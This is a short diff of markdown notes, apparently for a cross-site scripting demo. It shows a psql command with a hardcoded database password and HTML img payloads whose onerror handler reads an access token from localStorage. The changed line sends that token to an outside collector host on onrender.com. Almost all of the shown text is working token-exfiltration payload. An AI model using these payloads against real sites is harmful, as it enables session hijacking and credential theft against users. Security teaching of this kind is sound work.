@@ -17,5 +17,5 @@ PGPASSWORD=1234 psql -h frankfurt-postgres.render.com -U target target -f db.sql
 
 ```html
 <img src="" onerror="console.log(localStorage.getItem('accessToken'))" >
-<img src="" onerror="fetch('http://localhost:3001?q='+localStorage.getItem('accessToken'))" >
+<img src="" onerror="fetch('https://dropzone.onrender.com/?q='+localStorage.getItem('accessToken'))" >
 ```
